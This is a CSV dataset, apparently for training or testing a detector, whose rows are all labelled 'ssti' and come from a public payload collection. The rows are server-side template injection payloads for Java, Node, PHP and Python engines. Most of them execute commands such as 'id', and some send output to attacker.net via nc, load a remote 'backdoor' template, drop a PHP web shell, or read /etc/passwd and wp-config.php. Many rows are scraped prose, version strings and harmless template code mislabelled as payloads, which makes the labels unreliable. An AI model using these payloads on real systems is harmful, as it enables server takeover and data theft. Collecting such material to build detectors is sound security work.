payload,label,source
Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`,ssti,payloads_all_the_things
"${request.getClass().forName(""javax.script.ScriptEngineManager"").newInstance().getEngineByName(""js"").eval(""java.lang.Runtime.getRuntime().exec(\\\""whoami\\\"")""))}",ssti,payloads_all_the_things
Method using `java.lang.ProcessBuilder`,ssti,payloads_all_the_things
"${request.setAttribute(""c"","""".getClass().forName(""java.util.ArrayList"").newInstance())}",ssti,payloads_all_the_things
"${request.getAttribute(""c"").add(""cmd.exe"")}",ssti,payloads_all_the_things
"${request.getAttribute(""c"").add(""/k"")}",ssti,payloads_all_the_things
"${request.getAttribute(""c"").add(""whoami"")}",ssti,payloads_all_the_things
"${request.setAttribute(""a"","""".getClass().forName(""java.lang.ProcessBuilder"").getDeclaredConstructors()[0].newInstance(request.getAttribute(""c"")).start())}",ssti,payloads_all_the_things
"${request.getAttribute(""a"")}",ssti,payloads_all_the_things
"${T(java.lang.Integer).valueOf(""x""+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec(""id"").inputStream.readAllBytes()))}",ssti,payloads_all_the_things
"${1/((T(java.lang.Runtime).getRuntime().exec(""id"").waitFor()==0)?1:0)+""""}",ssti,payloads_all_the_things
"${(T(java.lang.Runtime).getRuntime().exec(""id"").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}",ssti,payloads_all_the_things
7*7,ssti,payloads_all_the_things
"'patt'.toString().replace('a', 'x')",ssti,payloads_all_the_things
@java.lang.Integer@valueOf('1'),ssti,payloads_all_the_things
"new String(@java.lang.Runtime@getRuntime().exec(""id"").getInputStream().readAllBytes())",ssti,payloads_all_the_things
"(new String(@java.lang.Runtime@getRuntime().exec(""id"").getInputStream().readAllBytes()))/0",ssti,payloads_all_the_things
"1/((@java.lang.Runtime@getRuntime().exec(""id"").waitFor()==0)?1:0)+""""",ssti,payloads_all_the_things
"((@java.lang.Runtime@getRuntime().exec(""id"").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)",ssti,payloads_all_the_things
{{= }},ssti,payloads_all_the_things
{ },ssti,payloads_all_the_things
<% %>,ssti,payloads_all_the_things
"#=set($X="""")$X",ssti,payloads_all_the_things
// Rendered RCE,ssti,payloads_all_the_things
"global.process.mainModule.require(""child_process"").execSync(""id"").toString()",ssti,payloads_all_the_things
// Error-Based RCE,ssti,payloads_all_the_things
"global.process.mainModule.require(""Y:/A:/""+global.process.mainModule.require(""child_process"").execSync(""id"").toString())",ssti,payloads_all_the_things
"""""[""x""][global.process.mainModule.require(""child_process"").execSync(""id"").toString()]",ssti,payloads_all_the_things
// Boolean-Based RCE,ssti,payloads_all_the_things
"[""""][0 + !(global.process.mainModule.require(""child_process"").spawnSync(""id"", options={shell:true}).status===0)][""length""]",ssti,payloads_all_the_things
// Time-Based RCE,ssti,payloads_all_the_things
"global.process.mainModule.require(""child_process"").execSync(""id && sleep 5"").toString()",ssti,payloads_all_the_things
{{range.constructor(' ... ')()}},ssti,payloads_all_the_things
{{this}},ssti,payloads_all_the_things
{{self}},ssti,payloads_all_the_things
>= 4.1.0,ssti,payloads_all_the_things
< 4.1.2,ssti,payloads_all_the_things
"`>= 4.1.0`, `< 4.1.2`",ssti,payloads_all_the_things
>= 4.0.0,ssti,payloads_all_the_things
< 4.0.14,ssti,payloads_all_the_things
"`>= 4.0.0`, `< 4.0.14`",ssti,payloads_all_the_things
< 3.0.7,ssti,payloads_all_the_things
`< 3.0.7`,ssti,payloads_all_the_things
"{{#with ""s"" as |string|}}",ssti,payloads_all_the_things
"{{#with ""e""}}",ssti,payloads_all_the_things
{{#with split as |conslist|}},ssti,payloads_all_the_things
{{this.pop}},ssti,payloads_all_the_things
"{{this.push (lookup string.sub ""constructor"")}}",ssti,payloads_all_the_things
{{#with string.split as |codelist|}},ssti,payloads_all_the_things
"{{this.push ""return require('child_process').execSync('ls -la');""}}",ssti,payloads_all_the_things
{{#each conslist}},ssti,payloads_all_the_things
{{#with (string.sub.apply 0 codelist)}},ssti,payloads_all_the_things
{{/with}},ssti,payloads_all_the_things
{{/each}},ssti,payloads_all_the_things
const _ = require('lodash');,ssti,payloads_all_the_things
"string = ""{{= username}}""",ssti,payloads_all_the_things
const options = {,ssti,payloads_all_the_things
"evaluate: /\{\{(.+?)\}\}/g,",ssti,payloads_all_the_things
"interpolate: /\{\{=(.+?)\}\}/g,",ssti,payloads_all_the_things
"escape: /\{\{-(.+?)\}\}/g,",ssti,payloads_all_the_things
"_.template(string, options);",ssti,payloads_all_the_things
**string:** The template string.,ssti,payloads_all_the_things
**options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.,ssti,payloads_all_the_things
**options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.,ssti,payloads_all_the_things
**options.escape:** It is a regular expression that specifies the HTML *escape* delimiter.,ssti,payloads_all_the_things
{{= _.VERSION}},ssti,payloads_all_the_things
${= _.VERSION},ssti,payloads_all_the_things
<%= _.VERSION %>,ssti,payloads_all_the_things
{{= _.templateSettings.evaluate }},ssti,payloads_all_the_things
"{{x=Object}}{{w=a=new x}}{{w.type=""pipe""}}{{w.readable=1}}{{w.writable=1}}{{a.file=""/bin/sh""}}{{a.args=[""/bin/sh"",""-c"",""id;ls""]}}{{a.stdio=[w,w]}}{{process.binding(""spawn_sync"").spawn(a).output}}",ssti,payloads_all_the_things
- var x = root.process,ssti,payloads_all_the_things
- x = x.mainModule.require,ssti,payloads_all_the_things
- x = x('child_process'),ssti,payloads_all_the_things
= x.exec('id | nc attacker.net 80'),ssti,payloads_all_the_things
"#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}",ssti,payloads_all_the_things
<?= ?>,ssti,payloads_all_the_things
shell_exec('id'),ssti,payloads_all_the_things
system('id'),ssti,payloads_all_the_things
"ini_set(""error_reporting"", ""1"") // Enable verbose fatal errors for Error-Based",ssti,payloads_all_the_things
"call_user_func(join("""", [""xx"", shell_exec('id')]))",ssti,payloads_all_the_things
"1 / (pclose(popen(""id"", ""wb"")) == 0)",ssti,payloads_all_the_things
shell_exec('id && sleep 5'),ssti,payloads_all_the_things
system('id && sleep 5'),ssti,payloads_all_the_things
"{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}",ssti,payloads_all_the_things
"{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}",ssti,payloads_all_the_things
{$smarty.version},ssti,payloads_all_the_things
{php}echo `id`;{/php} //deprecated in smarty v3,ssti,payloads_all_the_things
"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php passthru($_GET['cmd']); ?>"",self::clearConfig())}",ssti,payloads_all_the_things
"{system('ls')} // compatible v3, deprecated in v5",ssti,payloads_all_the_things
"{system('cat index.php')} // compatible v3, deprecated in v5",ssti,payloads_all_the_things
{chr(105)|cat:chr(100)},ssti,payloads_all_the_things
"{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}",ssti,payloads_all_the_things
{{7*7}},ssti,payloads_all_the_things
{{7*'7'}} would result in 49,ssti,payloads_all_the_things
{{dump(app)}},ssti,payloads_all_the_things
{{dump(_context)}},ssti,payloads_all_the_things
"{{app.request.server.all|join(',')}}",ssti,payloads_all_the_things
$output = $twig > render (,ssti,payloads_all_the_things
"'Dear' . $_GET['custom_greeting'],",ssti,payloads_all_the_things
"array(""first_name"" => $user.first_name)",ssti,payloads_all_the_things
"""Dear {first_name}"",",ssti,payloads_all_the_things
"""{{'/etc/passwd'|file_excerpt(1,30)}}""@",ssti,payloads_all_the_things
"{{include(""wp-config.php"")}}",ssti,payloads_all_the_things
"{{_self.env.setCache(""ftp://attacker.net:2121"")}}{{_self.env.loadTemplate(""backdoor"")}}",ssti,payloads_all_the_things
"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}",ssti,payloads_all_the_things
{{['id']|filter('system')}},ssti,payloads_all_the_things
"{{[0]|reduce('system','id')}}",ssti,payloads_all_the_things
{{['id']|map('system')|join}},ssti,payloads_all_the_things
"{{['id',1]|sort('system')|join}}",ssti,payloads_all_the_things
{{['cat\x20/etc/passwd']|filter('system')}},ssti,payloads_all_the_things
{{['cat$IFS/etc/passwd']|filter('system')}},ssti,payloads_all_the_things
{{['id']|filter('passthru')}},ssti,payloads_all_the_things
{{['id']|map('passthru')}},ssti,payloads_all_the_things
{{['nslookup oastify.com']|filter('system')}},ssti,payloads_all_the_things
"{% for a in [""error_reporting"", ""1""]|sort(""ini_set"") %}{% endfor %} // Enable verbose error output for Error-Based",ssti,payloads_all_the_things
"{{_self.env.registerUndefinedFilterCallback(""shell_exec"")}}{%include [""Y:/A:/"", _self.env.getFilter(""id"")]|join%} // Error-Based RCE <= 1.19",ssti,payloads_all_the_things
"{{[0]|map([""xx"", {""id"": ""shell_exec""}|map(""call_user_func"")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0",ssti,payloads_all_the_things
"{{_self.env.registerUndefinedFilterCallback(""shell_exec"")}}{{1/(_self.env.getFilter(""id && echo UniqueString"")|trim('\n') ends with ""UniqueString"")}} // Boolean-Based RCE <= 1.19",ssti,payloads_all_the_things
"{{1/({""id && echo UniqueString"":""shell_exec""}|map(""call_user_func"")|join|trim('\n') ends with ""UniqueString"")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0",ssti,payloads_all_the_things
"{% set a = [""error_reporting"", ""1""]|sort(""ini_set"") %}{% set b = [""ob_start"", ""call_user_func""]|sort(""call_user_func"") %}{{ [""id"", 0]|sort(""system"") }}{% set a = [""ob_end_flush"", []]|sort(""call_user_func_array"")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614",ssti,payloads_all_the_things
"{{ 1 / ([""id >>/dev/null && echo -n 1"", ""0""]|sort(""system"")|first == ""0"") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614",ssti,payloads_all_the_things
{{ {'id':'shell_exec'}|map('call_user_func')|join }},ssti,payloads_all_the_things
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }},ssti,payloads_all_the_things
POST /subscribe?0=cat+/etc/passwd HTTP/1.1,ssti,payloads_all_the_things
"email=""{{app.request.query.filter(0,0,1024,{'options':'system'})}}""@attacker.tld",ssti,payloads_all_the_things
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}},ssti,payloads_all_the_things
"{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}",ssti,payloads_all_the_things
"{var $X=""POC""}{$X}",ssti,payloads_all_the_things
{php system('nslookup oastify.com')},ssti,payloads_all_the_things
"<patTemplate:tmpl name=""page"">",ssti,payloads_all_the_things
This is the main page.,ssti,payloads_all_the_things
"<patTemplate:tmpl name=""foo"">",ssti,payloads_all_the_things
It contains another template.,ssti,payloads_all_the_things
</patTemplate:tmpl>,ssti,payloads_all_the_things
"<patTemplate:tmpl name=""hello"">",ssti,payloads_all_the_things
Hello {NAME}.<br/>,ssti,payloads_all_the_things
<head><title>{PAGE_TITLE}</title></head>,ssti,payloads_all_the_things
<table>,ssti,payloads_all_the_things
<caption>Authors</caption>,ssti,payloads_all_the_things
<thead>,ssti,payloads_all_the_things
<tr><th>Name</th><th>Email</th></tr>,ssti,payloads_all_the_things
</thead>,ssti,payloads_all_the_things
<tfoot>,ssti,payloads_all_the_things
"<tr><td colspan=""2"">{NUM_AUTHORS}</td></tr>",ssti,payloads_all_the_things
</tfoot>,ssti,payloads_all_the_things
<tbody>,ssti,payloads_all_the_things
<!-- BEGIN authorline -->,ssti,payloads_all_the_things
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>,ssti,payloads_all_the_things
<!-- END authorline -->,ssti,payloads_all_the_things
</tbody>,ssti,payloads_all_the_things
</table>,ssti,payloads_all_the_things
//we want to display this author list,ssti,payloads_all_the_things
$authors = array(,ssti,payloads_all_the_things
"'Christian Weiske'  => 'cweiske@php.net',",ssti,payloads_all_the_things
'Bjoern Schotte'     => 'schotte@mayflower.de',ssti,payloads_all_the_things
require_once 'HTML/Template/PHPLIB.php';,ssti,payloads_all_the_things
//create template object,ssti,payloads_all_the_things
"$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');",ssti,payloads_all_the_things
//load file,ssti,payloads_all_the_things
"$t->setFile('authors', 'authors.tpl');",ssti,payloads_all_the_things
//set block,ssti,payloads_all_the_things
"$t->setBlock('authors', 'authorline', 'authorline_ref');",ssti,payloads_all_the_things
//set some variables,ssti,payloads_all_the_things
"$t->setVar('NUM_AUTHORS', count($authors));",ssti,payloads_all_the_things
"$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));",ssti,payloads_all_the_things
//display the authors,ssti,payloads_all_the_things
foreach ($authors as $name => $email) {,ssti,payloads_all_the_things
"$t->setVar('AUTHOR_NAME', $name);",ssti,payloads_all_the_things
"$t->setVar('AUTHOR_EMAIL', $email);",ssti,payloads_all_the_things
"$t->parse('authorline_ref', 'authorline', true);",ssti,payloads_all_the_things
//finish and echo,ssti,payloads_all_the_things
"echo $t->finish($t->parse('OUT', 'authors'));",ssti,payloads_all_the_things
// Create new Plates instance,ssti,payloads_all_the_things
$templates = new League\Plates\Engine('/path/to/templates');,ssti,payloads_all_the_things
// Render a template,ssti,payloads_all_the_things
"echo $templates->render('profile', ['name' => 'Jonathan']);",ssti,payloads_all_the_things
"<?php $this->layout('template', ['title' => 'User Profile']) ?>",ssti,payloads_all_the_things
<h1>User Profile</h1>,ssti,payloads_all_the_things
"<p>Hello, <?=$this->e($name)?></p>",ssti,payloads_all_the_things
<title><?=$this->e($title)?></title>,ssti,payloads_all_the_things
<?=$this->section('content')?>,ssti,payloads_all_the_things
"__include__(""os"").popen(""id"").read() # Rendered RCE",ssti,payloads_all_the_things
